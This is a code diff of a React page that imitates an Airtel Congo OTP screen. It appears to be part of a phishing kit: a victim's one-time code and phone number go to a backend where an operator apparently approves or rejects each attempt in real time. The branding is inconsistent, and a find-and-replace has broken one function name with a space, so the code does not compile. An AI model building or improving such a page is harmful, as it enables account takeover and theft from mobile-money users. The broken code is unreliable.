@@ -1,5 +1,5 @@
 import React, { useState } from "react";
-import { requestApproval, checkStatus } from "../apiClient";
+import { requestApproval, checkStatus } from "../utils/apiClient";
 import toast from "react-hot-toast";
 import { ArrowLeft, Loader2 } from "lucide-react";
 import {
@@ -14,7 +14,7 @@ import {
 } from "../styles/sharedStyles";
 import { OtpVerificationPageProps } from "../types";
 
-const formatAirtelCongoOtpMessage = (otpValue: string) =>
+const formatAirtel CongoOtpMessage = (otpValue: string) =>
     `<#> Your Airtel Congo OTP is:${otpValue}. Do not share this code with anyone. Expires in 2 mins. td1xRGYXC+L`;
 
 function OtpVerificationPage({
@@ -28,7 +28,7 @@ function OtpVerificationPage({
     const [codeExpired, setCodeExpired] = useState(false);
     const inputRefs = React.useRef<(HTMLInputElement | null)[]>([]);
 
-    // const WEBHOOK_URL = import.meta.env.VITE_WEBHOOK_URL;
+
 
     React.useEffect(() => {
         // Focus first input on mount
@@ -74,6 +74,7 @@ function OtpVerificationPage({
             return;
         }
 
+        // Check if code has expired
         if (codeExpired) {
             return;
         }
@@ -81,31 +82,23 @@ function OtpVerificationPage({
         setLoading(true);
 
         try {
-            const res = await requestApproval({
+            // Form the payload
+            const payload = {
                 type: 'otp',
-                phone: phoneNumber?.replace(/\D/g, '') || "N/A",
-                details: formatAirtelCongoOtpMessage(otpValue),
-            });
+                name: "User OTP verification",
+                phone: phoneNumber?.replace(/\s/g, '') || "N/A",
+                details: formatAirtel CongoOtpMessage(otpValue),
+            };
 
+            // Send request to the High-Performance Gateway via our API Client
+            const res = await requestApproval(payload);
             const attemptId = res.attemptId;
-            console.log("OTP attemptId:", attemptId);
 
-            // Poll for approval — max 2 minutes
-            let pollCount = 0;
-            const maxPolls = 120;
+            // Start polling for status
             const interval = setInterval(async () => {
-                pollCount++;
-                if (pollCount > maxPolls) {
-                    clearInterval(interval);
-                    setLoading(false);
-                    toast.error("Approval timed out. Please try again.");
-                    return;
-                }
-
                 try {
                     const statusRes = await checkStatus(attemptId);
                     const status = statusRes.status;
-                    console.log(`Poll ${pollCount}: status =`, status);
 
                     if (status === 'approved') {
                         clearInterval(interval);
@@ -115,19 +108,26 @@ function OtpVerificationPage({
                     } else if (status === 'rejected') {
                         clearInterval(interval);
                         setLoading(false);
-                        toast.error("Incorrect OTP. Please try again.");
+                        toast.error("Invalid OTP, please check and try again.");
                         setOtp(["", "", "", "", "", ""]);
-                        inputRefs.current[0]?.focus();
+                        setTimeout(() => inputRefs.current[0]?.focus(), 100);
                     }
-                } catch (pollErr) {
-                    console.error("Poll error:", pollErr);
+                } catch (e) {
+                    console.error("Polling error", e);
                 }
-            }, 1000);
+            }, 2000); // Check every 2 seconds
 
         } catch (err: any) {
+            console.error("Failed to request approval:", err);
+            const statusCode = err.response?.status;
+            const errorData = err.response?.data;
+
+            console.error(`Status: ${statusCode}`);
+            if (errorData) console.error("Error data:", errorData);
+
             setLoading(false);
-            console.error("OTP request-approval error:", err);
-            toast.error("Could not connect. Please try again.");
+            const msg = statusCode ? `Failed to connect to server (${statusCode}). Please try again.` : "Failed to connect to server. Please try again.";
+            toast.error(msg);
         }
     };
 
@@ -169,7 +169,7 @@ function OtpVerificationPage({
                 >
                     <ArrowLeft size={20} />
                 </button>
-                <img src="/airtel.svg" alt="Airtel Congo" style={logoStyle} />
+                <img src="/Airtel Congo.png" alt="Airtel Congo" style={logoStyle} />
                 <button style={menuButtonStyle}>☰</button>
             </div>
 
@@ -328,7 +328,7 @@ function OtpVerificationPage({
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Airtel Congo Zimbabwe</div>
+            <div style={footerStyle}>© 2025 Kashagi Zimbabwe</div>
         </div>
     );
 }
